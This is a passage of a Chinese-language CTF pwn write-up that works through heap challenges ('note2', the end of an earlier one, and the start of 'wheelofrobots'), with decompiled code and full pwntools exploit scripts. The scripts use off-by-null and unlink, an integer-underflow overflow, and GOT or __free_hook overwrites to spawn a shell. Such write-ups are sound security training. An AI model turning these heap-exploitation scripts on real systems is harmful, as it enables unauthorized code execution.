process(<span class="string">'./pwn1'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,Content)</span>:</span></span><br><span class="line">	ru(<span class="string">"show"</span>)</span><br><span class="line">	sl(<span class="string">'3'</span>)</span><br><span class="line">	ru(<span class="string">"index:"</span>)</span><br><span class="line">	sl(str(index))</span><br><span class="line">	ru(<span class="string">"content:"</span>)</span><br><span class="line">	sd(Content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(Index)</span>:</span></span><br><span class="line">	ru(<span class="string">"show"</span>)</span><br><span class="line">	sl(<span class="string">'2'</span>)</span><br><span class="line">	ru(<span class="string">"index:"</span>)</span><br><span class="line">	sl(str(Index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">	ru(<span class="string">"show"</span>)</span><br><span class="line">	sl(<span class="string">'1'</span>)</span><br><span class="line">	ru(<span class="string">"index:"</span>)</span><br><span class="line">	sl(str(index))</span><br><span class="line">	ru(<span class="string">"size:"</span>)</span><br><span class="line">	sl(str(size))</span><br><span class="line">	ru(<span class="string">"content:"</span>)</span><br><span class="line">	sd(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(index)</span>:</span></span><br><span class="line">	ru(<span class="string">"show"</span>)</span><br><span class="line">	sl(<span class="string">'4'</span>)</span><br><span class="line">	ru(<span class="string">"index:"</span>)</span><br><span class="line">	sl(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#bk(0x400990)</span></span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0xf8</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">malloc(<span class="number">32</span>,<span class="number">0xf8</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0xf8</span>,<span class="string">'cccc'</span>)</span><br><span class="line">malloc(<span class="number">31</span>,<span class="number">0xf8</span>,<span class="string">'dddd'</span>)</span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">ptr = <span class="number">0x6021E0</span><span class="comment">#32</span></span><br><span class="line">FD = ptr - <span class="number">24</span></span><br><span class="line">BK = ptr - <span class="number">16</span></span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += p64(<span class="number">0</span>) + p64(<span class="number">0xf1</span>)</span><br><span class="line">py += p64(FD) + p64(BK)</span><br><span class="line">py = py.ljust(<span class="number">0xf0</span>, <span class="string">"\x00"</span>)</span><br><span class="line">py += p64(<span class="number">0xf0</span>)</span><br><span class="line">edit(<span class="number">32</span>,py)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#0xF8</span></span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += p64(<span class="number">0x6021E0</span>)*<span class="number">3</span> + p64(free_got)</span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">0xD0</span></span><br><span class="line">py += p64(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">32</span>,py)</span><br><span class="line">puts(<span class="number">32</span>)</span><br><span class="line">free_addr = u64(ru(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"free_addr---&gt;"</span> + hex(free_addr)</span><br><span class="line">onegadget = free_addr - libc.symbols[<span class="string">"free"</span>] + <span class="number">0x4526a</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"onegadget---&gt;"</span> + hex(onegadget)</span><br><span class="line">free_hook = free_addr - libc.symbols[<span class="string">"free"</span>] + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"free_hook---&gt;"</span> + hex(free_hook)</span><br><span class="line">pay = p64(free_hook)<span class="comment">#这里需要注意，edit又会被使用完，所以需要再覆盖一次为1</span></span><br><span class="line">pay = pay.ljust(<span class="number">0xf0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">pay += p64(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">31</span>,pay)</span><br><span class="line">edit(<span class="number">32</span>,p64(onegadget))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>最后free掉chunk0即可getshell~</p>
<p><img src="/blog_img/1563541805476.png" alt="1563541805476"></p>
<p><img src="/blog_img/1563541843948.png" alt="1563541843948">)<img src="/blog_img/1563541864806.png" alt="1563541864806"></p>
<p>总结：</p>
<p>这里学到了新的技巧是利用off by null+unlink（手动计算堆块大小0xf8），同时学到了那3个地址写同一个地方的操作（针对于只有free_hook可用，需要二次写入时），还有就是一个覆盖的问题，写入覆盖bss段中的内容。</p>
<p>接着再来看看一道unlink题目，这里有个新的知识点：</p>
<h4 id="note2："><a href="#note2：" class="headerlink" title="note2："></a>note2：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(stdin, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(stdout, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(stderr, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  puts(<span class="string">"Input your name:"</span>);</span><br><span class="line">  read_0(&amp;unk_6020E0, <span class="number">64L</span>L, <span class="number">10</span>);</span><br><span class="line">  puts(<span class="string">"Input your address:"</span>);</span><br><span class="line">  read_0(&amp;unk_602180, <span class="number">96L</span>L, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    switch ( menu() )</span><br><span class="line">    &#123;</span><br><span class="line">      case <span class="number">1</span>:</span><br><span class="line">        malloc_0();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      case <span class="number">2</span>:</span><br><span class="line">        puts_0();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      case <span class="number">3</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      case <span class="number">4</span>:</span><br><span class="line">        free_0();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      case <span class="number">5</span>:</span><br><span class="line">        puts(<span class="string">"Bye~"</span>);</span><br><span class="line">        exit(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      case <span class="number">6</span>:</span><br><span class="line">        exit(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      default:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们知道可以提取出函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"option---&gt;&gt;\n"</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"Input the length of the note content:(less than 128)"</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">"Input the note content:"</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"option---&gt;&gt;\n"</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">"Input the id of the note:"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,choice,Content)</span>:</span></span><br><span class="line">    ru(<span class="string">"option---&gt;&gt;\n"</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">"Input the id of the note:"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">"do you want to overwrite or append?[1.overwrite/2.append]"</span>)</span><br><span class="line">    sl(str(choice))</span><br><span class="line">    ru(<span class="string">"TheNewContents:"</span>)</span><br><span class="line">    sl(Content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"option---&gt;&gt;\n"</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">"Input the id of the note:"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"option---&gt;&gt;\n"</span>)</span><br><span class="line">    sl(<span class="string">'5'</span>)</span><br></pre></td></tr></table></figure>

<p>漏洞点挖掘：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_4009BD</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; a2 - <span class="number">1</span> &gt; i; ++i ) <span class="comment">//a2就是size，i是unsigned类型，如果a2=0，则a2-1=-1就会被看成是unsign类型，即0xfffffffffffffffff最大整数，可以说是无限输入字节了。这里就是溢出点。</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(i + a1) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(a1 + i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们知道了溢出但是怎么利用也是个问题，这里学到一招新招：</p>
<p>chunk1+chunk2+chunk3，我们在chunk1构造出一个fake_chunk,然后在chunk2中输入溢出修改chunk3从而达到目的，这里free掉了chunk3会先合并chunk2然后再合并chunk1，而我们的fake_chunk就是在chunk1的内容里面的：那么要得到这种chunk分布，应该怎么弄呢，这里就是要实现fastbinattack中的原堆块不变性，申请到和刚刚相近的块，直接拿回来直接用。</p>
<p>上exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#context(arch='i386', os='linux')</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./note2'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./note2'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"><span class="comment">#addr = u64(rc(6).ljust(8,'\x00'))</span></span><br><span class="line"><span class="comment">#addr = u32(rc(4))</span></span><br><span class="line"><span class="comment">#addr = int(rc(6),16)#string</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"option---&gt;&gt;\n"</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"Input the length of the note content:(less than 128)"</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">"Input the note content:"</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"option---&gt;&gt;\n"</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">"Input the id of the note:"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,choice,Content)</span>:</span></span><br><span class="line">    ru(<span class="string">"option---&gt;&gt;\n"</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">"Input the id of the note:"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">"do you want to overwrite or append?[1.overwrite/2.append]"</span>)</span><br><span class="line">    sl(str(choice))</span><br><span class="line">    ru(<span class="string">"TheNewContents:"</span>)</span><br><span class="line">    sl(Content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"option---&gt;&gt;\n"</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">"Input the id of the note:"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"option---&gt;&gt;\n"</span>)</span><br><span class="line">    sl(<span class="string">'5'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"length---&gt;"</span> + hex(len(<span class="string">'asdfkljlkdsjfjdsaokjflksdajfklsdajfklds'</span>))</span><br><span class="line">ptr0 = <span class="number">0x602120</span></span><br><span class="line">ru(<span class="string">"Input your name:"</span>)</span><br><span class="line">sl(<span class="string">'king'</span>)</span><br><span class="line">ru(<span class="string">"Input your address:"</span>)</span><br><span class="line">sl(<span class="string">'0x6020E0'</span>)</span><br><span class="line"><span class="comment">#bk(0x0000000000400F4A)</span></span><br><span class="line">FD = ptr0 - <span class="number">24</span></span><br><span class="line">BK = FD + <span class="number">8</span></span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)//这里fake_chunk大小随意，但是不要超过<span class="number">0x80</span></span><br><span class="line">py += p64(FD) + p64(BK)</span><br><span class="line">py = py.ljust(<span class="number">0x70</span>,<span class="string">'e'</span>)</span><br><span class="line">py += p64(<span class="number">0x70</span>) //这里是fake_chunk的大小，由于<span class="number">0x70</span>的右边都是<span class="number">0</span>，就会认为fake_chunk是free的状态</span><br><span class="line">malloc(<span class="number">0x80</span>,py)</span><br><span class="line">malloc(<span class="number">0x0</span>,<span class="string">'b'</span>*<span class="number">0x8</span>)</span><br><span class="line">malloc(<span class="number">0x80</span>,<span class="string">'c'</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">malloc(<span class="number">0x0</span>,<span class="string">'a'</span>*<span class="number">16</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>))<span class="comment">#fake_chunk所在的空间(0x80)和0x20的chunk块合并成0xa0的大小chunk，会实现unlink操作~</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">"atoi"</span>]</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">24</span></span><br><span class="line">py += p64(atoi_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,py)</span><br><span class="line">puts(<span class="number">0</span>)</span><br><span class="line">atoi_addr = u64(ru(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"atoi_addr----&gt;"</span> + hex(atoi_addr)</span><br><span class="line">system = atoi_addr - libc.symbols[<span class="string">"atoi"</span>] + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system---&gt;"</span> + hex(system)</span><br><span class="line">onegadget = atoi_addr - libc.symbols[<span class="string">"atoi"</span>] + <span class="number">0xf1147</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,p64(onegadget))</span><br><span class="line">ru(<span class="string">"option---&gt;&gt;\n"</span>)</span><br><span class="line">sl(<span class="string">"5"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这里我用onegadget，用system也是一样的，只是atoi的参数换成(“/bin/sh”)，这里学到的就是连带free的关系~</p>
<p>下面我们来看一道题，有关于off by one、fastbin attack 和unlink的题目，一道好题：</p>
<h4 id="wheelofrobots"><a href="#wheelofrobots" class="headerlink" title="wheelofrobots"></a>wheelofrobots</h4><p><img src="/blog_img/1563860471183.png" alt="1563860471183"></p>
<p>这里可以看到，是64位的程序，开了canary和NX保护，其他的没有开，这里got表可以改：</p>
<p>接着ida分析：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 input; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> choice_1; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  input = <span class="number">0L</span>L;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  sub_40174B();</span><br><span class="line">  sub_400A86();</span><br><span class="line">  qword_603130 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_400AD3();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Your choice : "</span>, input);</span><br><span class="line">      <span class="built_in">memset</span>(&amp;choice_603110, <span class="number">0</span>, <span class="number">4u</span>LL);</span><br><span class="line">      input = <span class="number">4L</span>L;</span><br><span class="line">      choice_1 = read_0(&amp;choice_603110, <span class="number">4u</span>LL);</span><br><span class="line">      <span class="keyword">if</span> ( choice_1 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      free_0();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( choice_1 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( choice_1 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        change();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( choice_1 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">run</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( choice_1 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">malloc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我做了一些处理，方便看，最后把函数都提取出来：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offbyone</span><span class="params">(inuse)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice : "</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"Your choice :"</span>)</span><br><span class="line">    sd(<span class="string">'7777'</span> + inuse)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(index,size)</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice :'</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'Your choice :'</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    <span class="keyword">if</span> index == <span class="number">2</span>:</span><br><span class="line">        